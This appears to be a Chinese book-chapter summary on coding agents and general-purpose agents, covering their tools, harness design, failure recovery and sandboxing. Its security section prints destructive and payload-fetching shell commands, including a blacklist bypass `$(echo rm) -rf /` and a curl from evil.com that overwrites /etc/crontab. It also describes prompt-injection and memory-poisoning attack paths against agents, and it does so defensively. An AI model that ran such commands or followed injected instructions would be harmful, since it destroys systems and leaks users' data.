# 第5章 Coding Agent 与通用 Agent

## 本章核心论题

以开放任务为目标的通用 Agent，其架构核心是一个 Coding Agent（能自主编写、修改和执行代码的 Agent）加上文件系统——Agent 用来存储代码、数据、记忆和中间结果的工作空间。这一判断来自工业界从 Manus 到 OpenClaw 的实践验证。代码生成不只是工具箱里的一件工具，而是一种"元能力"——能在运行时动态创造出新的工具和能力，从数学推理到业务规则约束、从多媒体生成到 Agent 自举，六大方向共同证明了这一论断。

## 关键论点与框架

### 1. Coding 是每个通用 Agent 都应具备的基础能力，而非少数专门化 Agent 的专利

**论证与机理**：代码生成在 Agent 体系中的价值体现在两个层面。思考上，形式化代码让思维高度严谨——"年龄大于 18 且已实名认证"用自然语言描述可能有多种理解，写成 `age > 18 and is_verified` 就毫无歧义。表达上，一段能跑通的代码本身就是逻辑自洽的证明，执行结果提供客观的对错标准——这是自然语言做不到的。在 SOTA 模型的加持下，具备基本 coding 能力并不需要复杂的架构。以"整理仓库中所有遗留的 TODO 注释"为例，完成这个任务只需浏览目录结构（ls/glob）、读取代码（read）、修改文件（edit/write）、运行命令（bash）、查找模式（grep/search）五类操作，覆盖了几乎所有 Coding Agent 的核心动作。

**实践配置**：一个基础 Coding Agent 只需七个核心工具——Code Interpreter（隔离沙盒安全执行 Python）、Bash Shell（终端执行命令）、读文件工具、写文件工具、编辑文件工具（局部修改）、文件名模式匹配（Glob）、文件内容搜索（Grep）。七个工具组合起来就能完成非常多样化的任务：遇到数学推理可写代码求解，需要固化业务规则时代码比自然语言精确，缺少某个工具可临时写一个，数据格式变了可动态生成解析逻辑。

**出处锚点**：5.1.1 节

### 2. Coding Agent 加文件系统是开放任务型通用 Agent 最核心的技术基础——Manus 与 OpenClaw 的验证

**论证与机理**：以 Manus 为代表的通用 Agent 产品，将 Deep Research、Computer Use 和 Coding 三大能力融合在一个系统中。为什么 Coding 是核心而非其他两种？因为几乎所有高效的内容生成最终都要落到代码上：PPT 本质上是 OOXML 格式的代码，Word 文档和 PDF 报告可通过代码生成，数据分析和可视化由 Python 脚本完成，甚至 GUI 操作中成功的浏览器操作序列也可以被固化为可复用的 RPA 代码。Deep Research 的搜索和信息综合可通过代码驱动的 Web 请求和解析实现；Computer Use 虽然通用性更强，但成本、延迟和稳定性远不如直接通过代码或 API 来完成相同操作。

**OpenClaw 的具体执行流**（"分析上季度销售数据并创建总结报告"）：Agent 首先读取 MEMORY.md 发现用户偏好 PDF 格式、数据源是 Google Sheets；通过网络搜索模块获取 API 使用方法，通过代码执行下载数据；用 Python 生成数据分析脚本（pandas 聚合、matplotlib 可视化）；将分析结果写入 report.pdf，图表写入 charts/目录；最后在 MEMORY.md 中记录"User's sales data is in Google Sheets, ID: xxx"，下次无需再问。整个过程中文件系统是信息流转的枢纽——记忆从文件读取，产物写入文件，经验也保存为文件。

**文件系统作为 Agent 中枢的独特设计**：OpenClaw 选择 Markdown 而非向量数据库存储长期记忆，这个看似反直觉的决定极其有效——用户可直接打开文件阅读和修改 Agent 的记忆，Markdown 天然保留时间顺序避免语义检索中的时间混淆，且可通过 Git 进行版本控制和回滚。

**适用边界**：这一判断主要适用于以开放任务为目标的通用 Agent——深度调研、内容生成、数据处理这类任务边界不确定、产物形态多样的场景。而垂直领域的客服 Agent，任务空间相对封闭，核心架构围绕固定业务流程、领域工具和对话策略构建，代码在其中更多是工具箱里的一件工具而非架构中枢。但即便在后者，coding 也是重要的基础能力。

**出处锚点**：5.1.2 节

### 3. Coding Agent 的理想工作流程映射了软件工程最佳实践，但现实中按反应式迭代循环运行，各环节按需裁剪

**论证与机理**：推荐的工程化流程包含五个阶段——项目文档化（首次接触代码仓库时先建立认知框架，生成架构概览、目录结构、测试运行指南）、任务理解与需求澄清（对复杂需求通过探索性调研澄清边界，必要时主动与用户对话）、编写设计文档（将抽象需求转化为具体实现计划，为人类提供高效介入点——审查简洁的设计文档比审查数百行代码容易得多）、代码实现与测试（实现→测试→修复循环，将"测试通过"而非"代码写完"定义为完成标准）、文档同步与交付（架构层面变化时相应更新架构文档）。

**现实中的裁剪**：Claude Code、OpenClaw 等实际产品更多按反应式的迭代循环工作——简单任务会跳过设计文档、不会每一步都阻塞等待用户批准，只有当任务复杂、影响面大时才完整走完各阶段。不同模型裁剪这套流程的方式并不相同：有些 Coding 模型会在第一次修改前广泛阅读目录、实现、调用方和测试；另一些则会读少数最可能相关的文件，马上提交补丁，再把编译与测试反馈当作调查的一部分。这种"何时停止收集信息、开始行动"的阈值首先是模型学到的行为策略，Harness 的提示词、工具和预算只能放大或抑制它。

**知识显式化原则及其推论**：项目指令文件（CLAUDE.md、AGENTS.md、.cursorrules）已成为事实标准——在每次会话开始时被自动注入上下文，承载面向 Agent 的行为约定（构建命令、代码风格、明确禁区）。一个有趣的推论是：对远程工作友好的团队往往也对 AI Agent 友好，因为远程团队被迫依赖异步沟通与文档化，这恰好就是 Agent 能消费的知识形态。评估一个团队的"AI-ready"程度，一个简单的代理指标是：一个远程新人只靠代码仓库和文档，能不能独立开展工作。

**出处锚点**：5.1.3 节

### 4. Coding Agent 的高成熟度不是因为代码生成模型特别强，而是软件工程几十年的基础设施天然构成了一套强大的 Harness

**论证与机理**：用任务清晰度和验证自动化程度两个维度将任务分成四种状态：目标明确且结果可自动验证是最佳区域（如修复有测试用例的 bug）；目标清楚但验收靠人审查，吞吐量的天花板就是人的审查速度；有自动化反馈但目标模糊，系统会高效地往错误方向跑；两者都缺，Agent 基本派不上用场。代码编写天然处于"目标明确 + 验证自动化"这个象限的核心——测试套件提供明确的验收标准，Linter 和类型检查器提供即时的自动化验证，Git 提供完美的版本控制和回退能力。

**业界三条实践案例**：大规模代码迁移案例中关键不在模型强，而在 Harness 做对了三件事——知识必须存在于代码库本身、约束编码进 Linter 和 CI 而非写在文档里、验证和纠正全链路自动化；LangChain 仅通过优化 Harness（系统提示词、工具中间件、自验证循环）就显著提升了基准任务表现，并开创了"用 Agent 分析失败轨迹来改进 Harness"的数据驱动方法论；Anthropic 将长任务拆分为初始化 Agent（分解为任务清单）和执行 Agent（逐步推进并保留中间成果），解决了长时运行 Agent"一次想做太多"或"过早声称完成"的问题。

**四条可迁移设计原则**：(1) 约束优先于指导——能用代码强制的规则就不要用文档建议，Linter 规则、类型约束、CI 检查的价值远超提示词中"请遵循……"式的指导；(2) 验证要自动化——人工审查是不可扩展的瓶颈；(3) 反馈越快越好、越结构化越好——错误信息越详细、越接近错误发生的时刻，Agent 纠正效率越高；(4) 回退要可靠——Git 分支、沙盒环境、快照机制确保任何错误都可逆。

**约束的另一层目的——防止过程性错误**：验收基线管的是结果对不对，执行边界管的是过程——即使结果正确，用错误的方法达成也不行。修复数据库故障时直接把库删了重建、"修复"确实生效但数据没了。第七章的 RLVP（验证路径惩罚）从训练侧回答同一问题：在最终结果奖励之外对过程中可验证的违规动作施加惩罚，把"不用破坏性手段"内化为模型的工程常识。

**工具编排的故障边界控制**：并行工具调用中，故障只在同一批并行调用内传播，不上升到父级操作——比如同时读取三个文件，其中一个找不到，只报告这一个失败，不取消另外两个，更不中止整个任务。

**出处锚点**：5.1.4 节

### 5. Agent 的可靠性不取决于它犯不犯错，而取决于每类错误是否都有对应的检测、恢复与终止路径

**论证与机理**：第一章的消融实验已展示问题的严重性——仅仅缺失一条工具结果反馈就足以让 Agent 陷入无限循环。生产级 Harness 需系统性地回答三个问题：会遇到哪些故障、如何检测与恢复、何时必须终止。

**四层故障分类**：API 层（限流、服务过载、请求超时、连接中断、输出触顶截断）、工具层（幻觉调用、参数畸形、执行抛异常、反复返回同一错误）、上下文层（窗口溢出、压缩失败、轨迹结构损坏）、控制流层（死循环、死亡螺旋——错误触发的恢复逻辑自身又调用 LLM、再次出错，连锁反应）。

**检测策略——先分类再计数**：捕获故障后的第一个判断不是"要不要重试"，而是"值不值得重试"。可重试错误（限流、过载、网络抖动）重试才有意义；不可重试错误（参数不合法、权限不足、工具不存在）必须改变输入或策略。模式检测包括重复调用指纹（工具名+参数计算指纹，相同指纹反复出现即无进展循环）和连续失败计数。流式连接还需独立的空闲看门狗（watchdog timer，超时后主动杀死挂起的流并触发重试）——SDK 超时机制往往只覆盖初始连接而非传输过程。完整性监控针对轨迹结构：发现工具调用缺少配对结果消息时自动修复配对关系，但注意生产模式可用占位符修补，训练模式则拒绝修复以免污染数据。

**分级恢复——逐级透明**：(1) 静默重试——可重试错误的默认动作，指数退避叠加随机抖动避免二次拥塞，区分前台与后台调用避免"重试放大"；(2) 降级与接续——输出触顶时先提升输出上限重发，仍不够则追加元指令让模型从断点接续；主模型过载时降级到备用模型（需先剥离旧模型私有格式块）；(3) 暴露给用户——所有自动手段用尽后才呈现错误并附上已尝试的恢复动作。工具层错误走特殊路径：不终止会话，把错误变成模型的输入——幻觉调用收到"工具不存在"的结构化错误，参数校验失败收到附带输入约束提示的错误。

**终止——每条恢复路径都要有上限**：Claude Code 的压缩熔断阈值"连续 3 次"来自真实会话统计——曾有一个会话在压缩恢复路径上连续失败三千余次，仅这类无效重试每天在全球浪费约 25 万次 API 调用；逾千个会话出现过 50 次以上连续失败。3 次正是"绝大多数故障在此之前已恢复"与"继续重试基本无望"之间的经验拐点。比单点熔断更隐蔽的是死亡螺旋：Agent 因上下文溢出停止触发"结束时自动提交代码"的停止钩子→钩子调用 LLM 生成 commit message→再次上下文溢出→再次触发钩子。防护靠两条：在错误路径上禁用一切会再次调用模型的副作用逻辑，用递归深度计数器检测并打断残余的连锁。

**出处锚点**：5.1.5 节

### 6. 五个实现技巧共同构成高效 Coding Agent 的技术基础——并行流式、上下文管理、环境感知、状态持久化、即时反馈

**论证与机理**：(1) 并行工具调用与流式执行：第一个工具调用的参数一经生成完整、通过校验即可立即执行，与后两个调用的生成过程重叠；彼此独立的调用并行执行而非排队等待，级联中止机制控制故障传播边界。(2) 上下文精细化管理：大型文件支持按行号范围读取，返回时附加行号标注让模型精确引用"第 42 行"；命令执行的长输出仅保留前若干行（含错误上下文）和后若干行（含错误总结），中间以提示替代，完整输出保存临时文件。(3) 环境信息动态注入：每次推理前以 Agent 状态栏形式注入当前工作目录、git 分支、最近提交记录、变更概览——这些信息不应硬编码在静态提示词中以免破坏 KV Cache 效率。(4) 命令执行环境的状态持久化：维护持久化终端会话，保留工作目录、环境变量和会话状态，避免每次命令都在全新 shell 中执行导致反复切换目录和激活虚拟环境。(5) 即时的语法反馈机制：文件写入操作完成后工具层自动运行 linter 或语法检查器，检查结果作为工具返回值呈现，Agent 在下一轮推理中立即看到错误——相当于程序员在 IDE 中打错括号编辑器立刻画红线。

**出处锚点**：5.1.6 节

### 7. 四种互补搜索工具构成"从粗到细、从语义到语法"的渐进式检索策略

**论证与机理**：正则表达式内容匹配（grep/ripgrep）适合已知具体文本的精确查找，支持文件类型过滤和路径模式过滤，局限是只能找到文本匹配的内容，无法理解语义；文件名模式匹配（glob）速度最快，是 Agent 探索项目结构的第一步——通过快速扫描建立项目的组织框架；语义代码搜索基于结构感知的分块（按函数、类、方法等完整语义单元切分）和混合检索（向量嵌入 + BM25 关键词匹配 + 重排序模型），适合探索性任务；符号级定义与引用查找（LSP）能区分同名符号的定义和调用，对代码重构尤其关键。

**语义搜索的路线之争**：以 Claude Code 为代表的终端型 Agent 刻意不建嵌入索引，纯靠 agentic 的 grep + glob 现场检索——不必维护随代码演化而陈旧的索引，省掉索引基础设施，避免代码嵌入外发到第三方服务。Cursor 等 IDE 型工具则走相反路线，愿意为跨文件的语义召回付出建索引的成本。两条路线的取舍本质上是"基础设施与数据外发的代价"和"跨文件语义召回的收益"之间的权衡。

**出处锚点**：5.1.7 节

### 8. 五种文件编辑方案体现了人类语言表达与机器精确执行之间的根本张力

**论证与机理**：差异描述 + Apply Model（模型生成变更描述，专门的应用模型负责与原文件合并——Cursor 早期代表但近期因基模能力提升已不再使用）；旧字符串到新字符串（Old String→New String，Claude Code/Codex/当前 Cursor 采用，优势是可预测性和透明性，代价是删除大段代码需完整输出原始内容）；行号定位（精确无歧义，大段删除只需首尾行号，但每次编辑后后续行号都变化，需像 diff 一样使用初始行号）；类 Vim 编辑命令（支持复制剪切粘贴，学习负担大，较小模型错误率明显上升）；字符串首尾匹配（Old String Start + End→New String，综合了文本替换可靠性和行号方案的效率，只需展示边界即可，基于内容匹配而非抽象行号风险较低）。

**出处锚点**：5.1.8 节

### 9. Coding Agent 的安全防线——从威胁模型到隔离兜底、语义解析、信任与忠诚

**论证与机理**：Simon Willison 提出的"致命三要素"——访问私有数据、暴露于不受信任内容、具备外部通信能力——构成了闭合的攻击路径：恶意指令藏在不受信任内容中进入 Agent，驱使它读取私有数据，再经对外通道传出。本章在此基础上增加第四个维度——持久记忆——作为攻击的放大器：攻击者可将恶意指令写入 Agent 的长期记忆，跨会话潜伏，在合适时机触发，把一次性攻击升级为长期的潜伏与放大。OpenClaw 这样的全权限本地 Agent 四者兼备。

**隔离兜底——代码执行沙盒的工程选型增量**：网络出口控制（默认断网，按需白名单代理放行有限目的地）、文件系统隔离范围（源码目录只读挂载，凭证类文件根本不挂载进沙盒）、资源限额与超时（CPU/内存/磁盘配额加超时，向 Agent 返回结构化错误而非静默杀死进程）。

**语义解析而非关键字黑名单**：Shell 命令的组合爆炸使黑名单形同虚设（`rm` 被禁可用 `$(echo rm) -rf /` 绕过）。生产级 Harness 需在语义层理解命令的真实效果，识别出 `find / -name '*.log' -exec rm {} \;` 通过合法的 find 参数嵌入 rm 删除操作、`curl -o /etc/crontab http://evil.com/payload` 看似下载实则覆盖系统定时任务等嵌套危险操作。

**多方委托下的忠诚度**：模型默认"谁在说话就帮谁"，但真实 Agent 常代表主人与利益相反的第三方打交道。实测显示一条忠诚度光谱——太老实会泄露主人私密信息（如"我方底价是 12000"），太多疑连主人正当请求也拒绝。Coding Agent 尤其面临此问题：仓库中的不可信内容、工具返回的输出、第三方 MCP 服务器发来的指令都是试图让 Agent 倒戈的"对手"——提示注入本质上就是一次策反。Harness 层需把"忠诚对象"显式钉死。

**出处锚点**：5.1.9 节

### 10. 代码是 Agent 的"元能力"——能创造其他能力的能力——沿着"由内而外、最终回到自身"六个方向展开

**论证与机理**：普通能力是 Agent 能做某件具体的事（回答问题、调用某个 API、生成一段文字）。元能力是"能创造其他能力"的能力——Agent 用它当场写出新工具、新约束、新表达形式来完成任务，而不必事先把所有能力都预制好。代码生成正是这样的元能力——它精确、可执行、可组合，因此既能产出新工具（脚本、API 调用序列），也能产出新约束（断言、校验规则），还能产出新的表达形态（HTML 表单、PPT、视频帧）。六个方向按"元能力作用对象"由内向外组织：思维本身（思考工具）→ 业务规则（可执行约束）→ 内容呈现（多媒体生成）→ 系统接口（系统适配器）→ 用户界面（生成式 UI）→ Agent 自身（自举）。

**出处锚点**：5.2 节

### 11. 代码作为思考工具——将概率性的自然语言推理替换为确定性的符号计算与约束求解

**论证与机理**：LLM 在自然语言理解和生成上表现惊人，但在精确计算、符号操作或严格逻辑推导上有根本短板——模型思考本质上是概率性的、近似的。代码推理将"理解问题"和"精确求解"分离：让 LLM 负责理解用户的自然语言问题并将其形式化为代码，让代码解释器负责精确计算。Wolfram 的洞察：LLM 弥补了 Wolfram Alpha 自然语言理解脆弱和覆盖面窄的短板，符号计算引擎弥补了 LLM 不擅长精确计算的短板，两者形成互补。

**实验 5-1（★★）** 验证 Agent 通过 Code Interpreter（配备 sympy/numpy/scipy）辅助数学解题，使用 AIME 风格题目对比纯思维链与代码辅助模式的准确率。**实验 5-2（★★）** 评估 Agent 通过 python-constraint 库求解逻辑谜题（骑士与无赖问题），目标准确率 90% 以上。

**一个关键发现**——模型与脚手架之间是此消彼长的关系：模型足够强时脚手架可以更薄（纯思考就能解出全部谜题，代码辅助增益收敛到零）；模型不够强时需在脚手架里做更多事情。本实验刻意选用较弱模型来放大对照。因此同一套脚手架配上不同能力的模型，结论可能截然不同。

**出处锚点**：5.2.1 节

### 12. 代码化业务规则——三重合保障将模糊的政策转化为不可绕过的安全防线

**论证与机理**："购买后 7 天内可退款"看似清楚，但"7 天"是自然日还是工作日？"购买"是下单时间还是发货时间？代码提供了无歧义的可执行知识表达方式。实践中应结合使用：系统提示词包含自然语言规则供理解和沟通，关键决策点配备代码化校验工具作为"守门员"确保合规性。代码化规则的真正价值不在于优化 token 效率，而在于防止不可逆的错误操作——取消订单、转出资金、删除数据一旦执行就无法撤销。

**τ-bench 航空公司取消政策的案例示范**：三重保障设计——(1) 系统提示词的自然语言规则帮助理解和解释；(2) 工具描述与可选的 expected_* 参数（cabin_class、has_insurance）作为 checklist，引导模型在调用前逐一核对政策条件——为了填好这些参数，模型必须先查询订单详情、逐条确认每个条件；(3) 服务端基于数据库真值的代码化校验作为最后守门员——舱位等级、保险状态、预订时间、航段使用情况、航班状态全部由服务端查询数据库获得，当前时间来自服务端时钟，没有任何一条政策事实来自模型自报的参数。原因是模型可能产生幻觉，也可能被提示注入操纵，最后一道防线必须建立在模型无法伪造的数据之上。

**实验 5-3（★★）** 基于 τ-bench 航空客服场景，小模型（Qwen3-4B）通过代码化业务规则验证政策执行准确率提升，同时统计 expected_* 自报值与数据库真值不一致的比例以验证"服务端真值校验"的必要性。

**出处锚点**：5.2.2 节

### 13. 代码驱动的多媒体生成——从 PPT 到视频，提议者-审核者机制实现内容质量的可控迭代

**论证与机理**：许多复杂文档的创作底层都由代码定义——HTML 描述结构，CSS 控制样式，JavaScript 实现交互。通过代码生成，Agent 绕开了 GUI 操作的视觉定位难题，获得对文档的精确控制能力。

**PPT 生成**：基于 Slidev 框架（Markdown + HTML 定义演示内容）。仅生成代码还不够——Agent 编写完代码后不知道实际渲染效果（内容是否太挤、文字是否溢出、图片尺寸是否合适），因此引入提议者-审核者机制：Proposer Agent 生成 Slidev 代码；Reviewer Agent 将每页渲染为图片，用 Vision LLM 从内容密度、可读性、布局合理性、视觉美感等维度分析，生成结构化改进建议（包含页码、问题类型、严重程度）；Proposer 接收反馈后修改代码，迭代直到"质量达标"或"达到最大次数"，这两者正是 Loop 工程要求的显式终止条件。采用双 Agent 分工而非单 Agent 循环的核心优势在于上下文管理——Reviewer 每次只处理最新版本的渲染图片，Proposer 仅累积结构化文本反馈。单 Agent 方案需要在同一上下文中累积数十页渲染图片的多轮迭代，上下文迅速超限。

**本章的提议者-审核者与第四章事前审批同源**——都是生成与审查分离、双模型独立评估（制造者与验证者分离的子 Agent），差异在目标与形态：第四章用于不可逆操作的安全审查（单次批准或否决），本章用于内容质量的迭代改进（多轮循环，审核者接触提议者看不到的新信息）。

**实验 5-4（★★）** 从学术论文自动生成 10-20 页高质量演示文稿。**实验 5-5（★★）** 扩展为论文讲解视频自动生成——生成口语化讲解文字、TTS 合成语音、ffmpeg 同步合成。**实验 5-6（★★）** 视频编辑——通过生成 Blender Python API 代码实现视频剪辑，采用"粗粒度定位（每 10 秒截图）→精细粒度定位（每秒截图）→Blender 脚本生成→关键帧审核→完整渲染"流水线。

**出处锚点**：5.2.3 节

### 14. 代码作为系统适配器——日志自适应解析与生产环境问题诊断的完全自动化

**论证与机理**：Agent 面对的外部服务常没有现成 SDK，接口未必规范——文档缺失、返回格式非标准、字段随版本漂移。代码在这里成了连接任意系统的"万能胶"。

**日志解析和可视化**：建立自动修复的反馈循环——前端遇到无法解析的日志格式时不显示错误，而是自动将失败信息（原始日志样本、详细报错）报告给 Agent；Agent 分析样本数据结构生成能正确解析的前端代码；代码先在虚拟浏览器中自动测试（用 Vision LLM 检查可视化效果），通过后热更新到前端系统。

**实验 5-7（★★★）** 构建能自我进化的 Agent 日志可视化系统，全流程自动化：检测失败→报告 Agent→生成解析代码→虚拟浏览器测试→热更新部署。

**生产环境问题诊断**：Agent 读取生产轨迹日志，结合架构文档和 PRD 判断执行流程是否符合预期，定位出问题的环节和模块，生成结构化问题报告（优先级、模块、描述、改进建议）和回归测试用例（引用轨迹 ID 和交互轮次，由测试框架自动重放验证），通过 MCP 对接 GitHub 创建 Issue——完成从问题发现到任务分派的全自动化。

**实验 5-8（★★★）** 从生产轨迹中自动发现问题、生成测试用例、创建工作项。

**RPA 作为极端形态**：当外部系统只暴露图形界面时，Agent 可先通过 Computer Use 操作界面，再把成功完成的操作序列用代码固化为 RPA 工具——未来执行相同任务时直接运行代码，不再需要调用昂贵的视觉思考。这种"工作流录制与固化"机制将在第八章展开。

**出处锚点**：5.2.4 节

### 15. 代码作为生成式 UI——从动态表单到完全动态生成软件，突破纯文本交互的限制

**论证与机理**：需要收集结构化信息时反复问答让对话冗长；需要呈现复杂数据关系时纯文本表达力有限。代码生成让 Agent 可动态创建表单、交互式图表甚至完整的 Web 应用。

**A2UI 类协议的安全设计**：Agent 不直接生成可执行的 HTML，而是只输出一份"界面描述清单"（JSON 格式），客户端用自己预先准备好的安全组件来渲染——就像餐厅的菜单：顾客只能点菜单上有的菜，而不能走进厨房自己做。安全优先是核心设计原则：客户端维护受信任的组件目录，Agent 只能请求渲染目录中已有的组件，无法注入任意代码。AG-UI（CopilotKit 提出）虽然名字相近，却不是界面描述语言，而是配套的事件/传输协议，负责把 Agent 的执行状态流式推送到前端，本身甚至可以承载 A2UI 这样的界面载荷。

**用 HTML 交付成果取代 Markdown 汇报**：交互式演示让人一看就懂；更好的数据可视化（图表而非表格，用户可自行浏览筛选下钻）；可持续完善的交付件（Agent 工作推进中持续补充完善）。笔者以自己研究项目为例——每个项目维护一个交互式网站，承担三类作用：实验数据追溯（每次实验数据、所用 prompt 以及 LLM 原始回复逐条查看，更容易发现数据构造、格式、分布上的问题）、训练指标监控（训练损失/验证损失、梯度范数、学习率、困惑度、RL 中的奖励/KL 散度/策略熵等"内科指标"能更早暴露训练崩溃等问题）、运行原理展示。

**动态表单澄清用户意图**：Agent 可生成含级联逻辑的表单（选择某选项后自动显示或隐藏后续问题），用户一次填写完所有信息，无需多轮对话。**实验 5-9（★★）** 验证此能力——用户说"我想订一张去北京的机票"，Agent 生成包含出发城市、日期、旅行类型（级联显示返程日期）的表单。**实验 5-10（★★）** 自然语言交互的 ERP Agent——将用户查询转 SQL，包含员工表和工资表，回答涉及平均在职时长、部门统计、薪资分析等十类复杂查询。

**Artifact 模式**：Agent 不自己读数据，而是生成 SQL 查询代码作为 artifact 交给系统直接执行，数据从数据库直达用户界面，完全绕过 LLM 这个"中间人"。但生成代码不能直接执行——应使用只读数据库账号，解析 SQL 只允许 SELECT，用户提供的值由服务端参数化绑定，限制查询时间和返回行数。

**动态生成软件的权限下沉**：当接口、工作流乃至数据访问代码都由 Agent 随时生成或改写时，业务代码中的权限检查不再稳定。更稳妥的架构是把信任边界下移到数据层——动态生成的应用层负责界面、流程和业务编排，而真正决定"谁能对哪条数据做什么"的规则由一层稳定、经过人类审查的机制强制执行（数据库行级安全策略、约束和校验器、受控数据访问服务）。每次读写携带由受信任运行时绑定的访问上下文（用户、租户、角色、Agent 身份），动态生成的代码只能以受限身份访问数据，不能自行伪造身份或获得可绕过规则的高权限凭证。

**实验 5-11（★★）** 对话式界面定制系统——用户自然语言定制 UI，热加载实时生效。**实验 5-12（★★★）** 动态生成软件的权限内嵌数据对象——构建能在数据层强制执行权限和数据完整性的对象存储，验证生成代码即使跳过状态机、写入越界数据或尝试跨租户读取，也不能突破稳定的数据层边界。

**出处锚点**：5.2.5 节

### 16. 代码创造代码——Agent 自举，从自我修复到创造全新 Agent

**论证与机理**：Agent 自举的一个重要前提是自我修复能力。OpenClaw 的 doctor 命令体现了两层设计——第一层是确定性检查：过期 token、锁文件、端口冲突这类高频问题本身就有明确的检测规则和固定修复动作，与传统运维脚本无异；第二层才是真正的 Agent 能力：对确定性规则未覆盖的疑难问题，交给 LLM 分析错误日志、理解配置文件语义、推断问题因果关系，生成针对性的修复方案。两层配合，doctor --fix 才能自动解决相当一部分常见网关问题。

**让 Agent 编写 Agent 的关键技巧**：创造高质量 Agent 远比生成普通应用代码复杂。常见缺陷包括——上下文管理的随意性（未采用标准上下文格式、忽略 KV Cache 优化）、工具设计的不规范（描述简略、缺少使用边界说明和负面清单）、技术选型的滞后性（倾向使用训练数据中最常见但已过时的模型和 API）、外部生态的脱节（使用废弃 API 和不再维护的库）。解决的最有效路径不是在提示词中穷尽所有规则，而是提供高质量 Agent 实现作为参考范例，引导代码生成 Agent 在此基础上修改——范例代码本身就是最佳实践的载体，架构上的好选择会自然保留下来。

**实验 5-13（★★★）** 构建具备元编程能力的 Coding Agent，提供 ch5/coding-agent 项目本身作为参考范例，接到创建新 Agent 需求时先复制范例代码再针对性修改——调整系统提示词匹配新角色，替换或增删工具适应新功能，修改业务逻辑但保留架构框架。对比"从零生成"和"基于范例修改"两种模式在质量和效率上的差异。这种"自我复制并适应性修改"的模式，既保证新 Agent 继承核心技术优势，又允许在特定维度上差异化。

**出处锚点**：5.2.6 节

## 原则清单

1. **知识必须存在于代码库本身**：Agent 看不到的等于不存在。项目指令文件（CLAUDE.md、AGENTS.md）是最经济的稳定前缀，内容不随任务变化，天然对 KV Cache 友好。
2. **约束优先于指导**：能用代码强制的规则就不要用文档建议。Linter 规则、类型约束、CI 检查的价值远超提示词中"请遵循……"式的指导。
3. **验证要自动化**：人工审查是不可扩展的瓶颈。将"测试通过"而非"代码写完"定义为完成标准。
4. **回退要可靠**：Git 分支、沙盒环境、快照机制确保任何错误都可逆。
5. **反馈越快越好、越结构化越好**：错误信息越详细、越接近错误发生时刻，Agent 纠正效率越高。
6. **约束过程而不仅仅是结果**：即使结果正确，破坏性捷径也是不可接受的。
7. **故障只在同一批并行调用内传播**：一个工具失败不上升为整个任务中止。
8. **先分类再重试**：区分可重试错误（限流、网络抖动）和不可重试错误（参数不合法、权限不足），后者必须改变输入或策略。
9. **恢复期间扣留错误消息**：中间错误不应暴露给消费者，恢复成功则消费者毫无感知，全部失败才一并释放。
10. **每条恢复路径都要有熔断上限**：阈值应从产线数据统计得出而非拍脑袋。
11. **在错误路径上禁用一切会再次调用模型的副作用逻辑**：防止死亡螺旋。
12. **代码化规则的真值必须来自模型无法伪造的数据源**：服务端时钟而非模型自报的时间，数据库真值而非模型声明的参数。
13. **安全优先于灵活**：生成式 UI 先限制在受信任组件目录，再考虑完全动态生成。
14. **信任边界下移到数据层**：动态生成的应用代码不可靠，权限必须在稳定的数据层强制执行。
15. **基于范例修改优于从零生成**：范例代码本身就是最佳实践的载体。
16. **在确认无法恢复之前，不暴露中间态**：面向用户的错误呈现需在所有自动恢复手段用尽之后。

## 失败模式与反例

1. **跳过测试直接报告完成**：Coding Agent 最常见的偷懒方式。写完代码不跑测试就报告"任务完成"，本质是过早终止。应对：将"测试通过"定义为完成标准。
2. **破坏性捷径**：修复数据库故障时直接把库删了重建，"修复"确实生效但数据没了；修复编译错误时把代码全删重写，编译通过但实现没了。应对：对 rm -rf、删除生产数据、覆盖未读文件设置专门检查与审批。
3. **不可重试错误的盲目重试**：参数不合法或权限不足时原样重试多少次都是同样的结果。应对：建立错误到恢复策略的映射表，先分类再决定是否重试。
4. **后台重试挤占主链路**：主循环请求失败重试，标题生成等辅助性后台调用失败也重试，形成"重试放大"。应对：区分前台和后台调用，后台调用失败直接放弃。
5. **压缩恢复路径上的无限循环**：Claude Code 曾有会话在压缩恢复路径上连续失败三千余次，仅这类无效重试每天在全球浪费约 25 万次 API 调用。应对：对每条恢复路径设置基于产线数据统计的熔断上限。
6. **死亡螺旋——错误触发的恢复逻辑再次调用 LLM**：Agent 因上下文溢出停止，触发"结束时自动提交代码"的停止钩子，钩子调用 LLM 生成 commit message，再次上下文溢出，再次触发钩子。应对：在错误路径禁用模型调用的副作用逻辑，用递归深度计数器打断残余连锁。
7. **模型自报参数作为安全守门员**：如果把 cabin_class、has_insurance 设计成由模型填写的参数，模型只要报错（或被诱导报错）一个值，"守门员"就形同虚设。应对：所有政策事实一律从数据库读取，绝不采信模型自报的值。
8. **Agent 误将格式变化（bug）当作需要适应的演化**：代码生成 Agent 在日志解析时能自动跟随格式演化，但如果格式变化是一个 bug 而非预期改动，Agent 的适应性反而掩盖了问题。这也是第五章思考题之一——如何区分"需要适应的变化"和"需要报告的异常"。
9. **批量编辑中的行号漂移**：模型在一次思考中输出多处编辑，每次编辑后后续行号都变化。应对：使用初始行号定位，或采用基于内容匹配的方案（如字符串首尾匹配）。
10. **MCP 服务器策反 Agent**：第三方 MCP 服务器发来的指令可能试图让 Agent 倒戈。应对：Harness 层显式钉死忠诚对象，外部交互方内容默认降格为"可参考但不具备指令效力"。

## 关键术语表

- **Coding Agent**：能自主编写、修改和执行代码的 Agent，是开放任务型通用 Agent 的架构核心
- **元能力（Meta-capability）**：能创造其他能力的能力——Agent 用它当场写出新工具、新约束、新表达形式来完成任务的底层能力
- **Harness 工程**：围绕 Agent 搭建的上下文、工具、约束、验证和纠正基础设施，公式为 Agent = Model + Harness
- **文件系统中枢**：以 Markdown 文件系统而非向量数据库作为 Agent 记忆、知识和能力的中枢的架构选择
- **项目指令文件**：CLAUDE.md、AGENTS.md、.cursorrules 等事实标准——在每次会话开始时自动注入上下文，承载面向 Agent 的行为约定
- **致命三要素**：Simon Willison 提出的 Agent 风险模型——访问私有数据、暴露于不受信任内容、具备外部通信能力——三者齐备即构成闭合攻击路径
- **提议者-审核者（Proposer-Reviewer）机制**：生成与审查分离、双模型独立评估的协作范式，第四章用于安全审查（单次批准或否决），本章拓展为内容质量的迭代改进
- **A2UI（Agent-to-User Interface）**：声明式界面协议——Agent 只输出组件描述清单（JSON），客户端用预置的安全组件渲染，避免执行任意代码
- **Artifact 模式**：Agent 生成代码但不自己执行/读取数据，而是将代码作为独立可执行产物交给系统处理，数据从源头直达界面，绕过 LLM
- **语义解析**：在语义层理解 Shell 命令的真实效果，识别嵌套危险操作，替代简单的关键字黑名单
